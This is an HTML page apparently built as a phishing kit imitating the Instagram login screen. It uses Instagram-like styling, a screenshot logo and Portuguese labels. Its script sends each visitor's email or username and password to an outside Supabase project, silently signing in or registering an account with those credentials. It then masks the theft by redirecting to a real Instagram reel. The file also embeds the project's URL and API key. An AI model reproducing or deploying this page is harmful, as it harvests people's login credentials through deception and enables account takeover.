<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>• Entrar</title>

  <link rel="icon" href="favicon.ico" type="image/x-icon">

  <style>
    * {
      box-sizing: border-box;
      font-family: system-ui, -apple-system, BlinkMacSystemFont,
        "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      margin: 0;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 350px;
      padding: 40px 30px;
      text-align: center;
    }

    .logo {
      margin-bottom: 30px;
    }

    .logo img {
      max-width: 180px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      background: #4cb5f9;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="logo">
      <img
        src="https://i.postimg.cc/zDdCYPyg/Captura-de-tela-2025-12-17-221627.png"
        alt="Logo"
      />
    </div>

    <form id="authForm">
      <input
        id="email"
        type="text"
        placeholder="Email ou usuário"
        required
      />
      <input
        id="password"
        type="password"
        placeholder="Senha"
        required
      />
      <button type="submit">Entrar</button>
    </form>
  </div>

  <!-- Tela branca -->
  <div
    id="whiteScreen"
    style="
      display:none;
      position:fixed;
      inset:0;
      background:#fff;
      z-index:9999;
    ">
  </div>

  <!-- Supabase -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <script>
    const SUPABASE_URL = "https://pwmtpvsgykjvouljjmrz.supabase.co";
    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8";

    const supabaseClient = supabase.createClient(
      SUPABASE_URL,
      SUPABASE_KEY
    );

    document.getElementById("authForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      let email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;

      // ⚡ auto-complete gmail
      if (!email.includes("@")) {
        email = email + "@gmail.com";
      }

      // 1️⃣ tenta login
      const { error: loginError } =
        await supabaseClient.auth.signInWithPassword({
          email,
          password
        });

      if (!loginError) {
        redirect();
        return;
      }

      // 2️⃣ se não existir → cadastra
      if (loginError.message.includes("Invalid login credentials")) {
        const { error: signupError } =
          await supabaseClient.auth.signUp({
            email,
            password
          });

        if (signupError) {
          alert("Erro no cadastro: " + signupError.message);
          return;
        }

        redirect();
        return;
      }

      // 3️⃣ outro erro
      alert(loginError.message);
    });

    function redirect() {
      document.getElementById("whiteScreen").style.display = "block";
      setTimeout(() => {
        window.location.href =
          "https://www.instagram.com/reels/DSYPgN7EVG3/";
      }, 150);
    }
  </script>
</body>
</html>
